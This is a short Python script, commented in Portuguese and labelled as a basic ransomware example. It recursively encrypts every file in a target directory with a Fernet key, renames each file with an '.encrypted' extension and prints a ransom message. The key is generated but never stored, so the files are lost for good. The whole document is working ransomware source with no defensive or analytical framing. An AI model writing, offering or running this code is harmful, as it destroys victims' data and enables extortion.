"""

Exemplo básico de ransomware em python

"""

import os
from cryptography.fernet import Fernet

# Diretório alvo para criptografar os arquivos
target_directory = "/caminho/do/diretorio"

# Gerar chave de criptografia
key = Fernet.generate_key()
fernet = Fernet(key)

# Percorrer os arquivos no diretório alvo
for root, directories, files in os.walk(target_directory):
    for file in files:
        # Ignorar arquivos já criptografados
        if file.endswith(".encrypted"):
            continue
        
        file_path = os.path.join(root, file)
        
        # Ler o conteúdo do arquivo
        with open(file_path, "rb") as f:
            original_data = f.read()
        
        # Criptografar o conteúdo do arquivo
        encrypted_data = fernet.encrypt(original_data)
        
        # Renomear o arquivo original com a extensão .encrypted
        new_file_path = file_path + ".encrypted"
        os.rename(file_path, new_file_path)
        
        # Escrever o conteúdo criptografado no novo arquivo
        with open(new_file_path, "wb") as f:
            f.write(encrypted_data)

# Exibir mensagem de resgate
print("Seus arquivos foram criptografados! Para recuperá-los xxx")
